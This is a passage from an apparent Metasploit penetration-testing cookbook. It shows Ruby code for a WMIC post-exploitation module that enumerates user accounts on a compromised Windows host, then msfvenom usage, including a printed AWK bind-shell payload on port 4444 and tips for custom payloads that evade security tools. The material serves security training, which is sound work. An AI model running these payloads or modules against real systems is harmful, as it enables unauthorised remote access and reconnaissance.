
```
store_wmic_loot(result, cmd)
end
end

def store_wmic_loot(result_text, cmd)
    command_log = store_loot("host.command.wmic",
                            "text/plain",
                            session,
                            result_text,
                            "#{cmd.gsub(/\.|\||\s/, "_")}.txt",
                            "Command Output \\ 'wmic #{cmd.chomp}\\'")
    print_status("Command output saved to: #{command_log}")
end
end
```

Now that we have built some background about module building, our next step will be to analyze the module. It is highly recommended that you look at existing modules if you have to learn and dive deeper into module and platform development.

## How it works...

Let's start with the analysis of the main script body to understand how it works:

- 1. The module starts by verifying if a resource file is supplied. If so, it will run a WMIC query for each line and store the results:
```
if datastore['RESOURCE']
  if ::File.exist?(datastore['RESOURCE'])
    ::File.open(datastore['RESOURCE']).each_line
    do |cmd|
      next if cmd.strip.length < 1
      next if cmd[0,1] == "#"
      print_status "Running command #{cmd.chomp}"
      result = wmic_query(cmd.chomp)
      store_wmic_loot(result, cmd)
    end
  else
    raise "Resource File does not exists!"
  end
```
- 2. Otherwise, it will check for a wmic command, run it, and store the results:
```
elsif datastore['COMMAND']
    cmd = datastore['COMMAND']
    result = wmic_query(cmd)
    store_wmic_loot(result, cmd)
end
end
```

## Writing a post-exploitation module

Now, we have covered enough background about building modules. In this recipe, we will see an example of how we can build our own module and add it to the framework. Building modules can be very handy, as they will give us the power of extending the framework depending on our needs.

## Getting ready

Let's build a small post-exploitation module that will enumerate all of the users on the target using WMIC. As it is a post-exploitation module, we will require a compromised target in order to execute the module:
```
class MetasploitModule < Msf::Post
  include Msf::Post::Windows::WMIC
```
The script starts up with the class that extends the properties of the Msf::Post modules and the include statement to include the WMIC functionality.

Next, we will define the module's name, description, author, platform, and session type:
```
def initialize(info={})
  super( update_info( info,
    'Name' => 'Windows WMIC User Gather',
    'Description' => %q{
      This module will enumerate user accounts
      using WMIC.
    },
    'License' => MSF_LICENSE,
    'Author' => [
      'Daniel Teixeira <danieljc.teixeira [at]gmail.com>',
    ],
```
```
'Platform' => [ 'win' ],
'SessionTypes' => [ 'meterpreter' ]
))
end
```

For the run method, we will use wmic_query to enumerate the user accounts:
```
# Main method

def run
  print_status("Executing command")
  command = wmic_query("useraccount get name")
  puts command
end
end
```

Metasploit follows the hierarchy of a generalized to specialized format for storing modules. It starts with the type of modules, such as an exploit module or an auxiliary module. Then it picks up a generalized name, for example, the name of an affected operating system. Next, it creates a more specialized functionality; for example, the module is used for browsers. Finally, the most specific naming is used, such as the name of the browser that the module is targeting.

Let's consider our module. This module is a post-exploitation module that is used to enumerate a Windows operating system and gathers information about the system. So, our module should follow this convention for storing information.

Our destination folder should be modules/post/windows/gather/. You can save the module with your desired name and with an .rb extension. Let's save it as wmic_user_enum.rb.

## How to do it...

Once we have saved the module in its preferred directory, the next step will be to execute it and see if it is working. We have already seen the process of module execution in previous recipes:
```
msf exploit(psexec) > use post/windows/gather/
wmic_user_enum
msf post(wmic_user_enum) > set SESSION 1
SESSION => 1
msf post(wmic_user_enum) > run

[*] Executing command
Name
Administrator
anakin_skywalker
...

[*] Post module execution completed
msf post(wmic_user_enum) >
```

This is a small example of how you can build and add your own module to the framework. You definitely need a sound knowledge of Ruby scripting if you want to build good modules. You can also contribute to the Metasploit community by releasing your module and let others benefit from it.

## 15 Using MSFvenom

In this chapter, we will cover the following recipes:

- Payloads and payload options
- Encoders
- Output formats
- Templates
- Meterpreter payloads with trusted certificates

## Introduction

By now, you should already be familiar with MSFvenom, as we have used it a couple of times in previous recipes. MSFvenom is the tool to use for payload generation and encoding and it is an evolution of `msfpayload` and `msfencode`, which it replaced on June 8th, 2015.

In this chapter, we dig a bit deeper on the available payloads, learn why encoders can be useful when trying to evade detection, check the available executable, transform output formats, and much more.

## Payloads and payload options

We can tell MSFvenom is one of the most versatile and useful payload-generation tools just by looking at the available payloads; the list proves that MSFvenom can help you get a session in almost any situation.

## Getting ready

To start experimenting with msfvenom, launch a Terminal window, and use msfvenom -h or msfvenom --help to display the help menu.

## How to do it...

- 1. Let's take a look at the available payloads, using the msfvenom command with the -l option:
  
  ```
  root@kali:~# msfvenom -l payloads
  ```
  
  Because the output of the command is too extensive to fit in this recipe, I will leave that for you to try out.
  
- 2. To generate a payload, we always need to use at least two options, -p and -f. The -p option is used to specify which payload to generate from all those available in the Metasploit Framework, in this example a bind shell via GNU AWK:
  
  ```
  root@kali:~# msfvenom -p cmd/unix/bind_awk -f raw
  No platform was selected, choosing Msf::Module::Platform::Unix from the payload
  No Arch selected, selecting Arch: cmd from the payload
  No encoder or badchars specified, outputting raw payload
  Payload size: 96 bytes
  awk 'BEGIN{s="/inet/tcp/4444/0/0";for(;s|&getline c;close(c))while(c|getline)print|&s;close(s)}'
  ```
- 3. The -f option is used to specify the output format and to list all the available formats, use msfvenom with the --help-formats option:
```
root@kali:~# msfvenom --help-formats
Executable formats
  asp, aspx, aspx-exe, axis2, dll, elf, elf-so, exe,
exe-only, exe-service, exe-small, hta-psh, jar, jsp,
loop-vbs, macho, msi, msi-nouac, osx-app, psh, psh-cmd,
psh-net, psh-reflection, vba, vba-exe, vba-psh, vbs,
war
Transform formats
  bash, c, csharp, dw, dword, hex, java, js_be,
js_le, num, perl, pl, powershell, ps1, py, python,
raw, rb, ruby, sh, vbapplication, vbscript
```

There are two types of formats in msfvenom, executable and transform formats. Executable formats will generate programs and scripts, while transform formats will just produce the payload.

- 4. We can also specify a custom payload by using the -p option with -, which can be useful when trying to evade security solutions:
```
root@kali:~# cat custom.raw | msfvenom -p - -a x64
--platform linux -f elf -o custom.elf
Attempting to read payload from STDIN...
No encoder or badchars specified, outputting raw
payload
Payload size: 86 bytes
Final size of elf file: 206 bytes
Saved as: custom.elf
root@kali:~#
```

When generating payloads, we use the -a option for the architecture to use, --platform to specify the platform of the payload, and -o to save the payload.

- 5. To list all the available platforms, use msfvenom with the --help-platforms option:
```
root@kali:~# msfvenom --help-platforms
Platforms
  aix, android, bsd, bsdi, cisco, firefox, freebsd,
hardware, hpux, irix, java, javascript, linux,
mainframe, multi, netbsd, netware, nodejs, openbsd,
osx, php, python, r, ruby, solaris, unix, windows
root@kali:~#
```
